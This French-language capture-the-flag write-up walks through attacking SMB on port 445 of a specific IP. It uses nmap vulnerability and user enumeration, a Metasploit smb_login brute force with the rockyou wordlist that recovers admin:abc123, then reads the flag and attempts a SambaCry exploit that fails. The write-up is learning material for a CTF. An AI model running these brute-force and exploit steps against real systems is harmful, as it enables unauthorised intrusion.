# exploit SMB sur le port 445

un peu plus "technique" car on va passer par metasploit qui a pléthore d'outils/plugin pour faciliter la vie.

on peut le faire à la main mais la flemme :D

ici plusieurs étapes: il faut trouver le nom du workgroup, le nom du user puis le password du user.

## énumération de failles

```sh
nmap -Pn -p 445 -script=vuln -oA vuln $RHOST
```

voir [rapport nmap](./vuln.nmap)

## énumération des partages

```sh
smbclient --no-pass --list //$RHOST
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	shared          Disk      
	IPC$            IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 51.68.36.97 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

Faut qu'on apprenne le nom du workgroup :(

## énumération des users

avec `nmap`:

```sh
nmap --script smb-enum-users.nse -p445 $RHOST
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 05:45 CET
Nmap scan report for ns3122111.ip-51-68-36.eu (51.68.36.97)
Host is up (0.21s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

le DOMAIN est NS3122111. ajout dans ``.envrc`.

avec msf

```sh
use auxiliary/scanner/smb/smb_enumusers
set RHOST 51.68.36.97
run
...
domain NS3122111
user admin
```

confirmation du domain, ajout du user end `.envrc`

## recherche du mot de passe

avec metasploit, lancer `msfconsole`:

```sh
use auxiliary/scanner/smb/smb_login
set RHOST 51.68.36.97
set SMBDomain NS3122111
set SMBUser admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

[+] 51.68.36.97:445       - 51.68.36.97:445 - Success: 'NS3122111\admin:abc123'

unset PASS_FILE
set CreateSession true
run

# on récupère une session
sessions -i -1
shares
shares -i shared
ls
cat flag.txt
FLAG2{a293ad2fb67c5e70a0cececbaf6304f5e72224a4}
```

## approfondissement avec les failles relevées dans le scan

idem avec metasploit

```sh
search CVE-2017-749 # la faille la mieux notée
use exploit/linux/samba/is_known_pipename
options
# il faut un répertoire accessible en écriture
```

recherche d'un répertoire en écriture
```sh
use auxiliary/scanner/smb/smb_login
set RHOST 51.68.36.97
set SMBDomain NS3122111
set SMBUser admin
set SMBPass abc123
set CreateSession true
run
sessions -u -1
shares -i shared
ls # pas de répertoire
mkdir test 
[-] Error running command mkdir: RubySMB::Error::UnexpectedStatusCode The server responded with an unexpected status code: STATUS_ACCESS_DENIED
# on en peut pas aller plus loin
```

Les organisateurs sont vraiment pas fun !
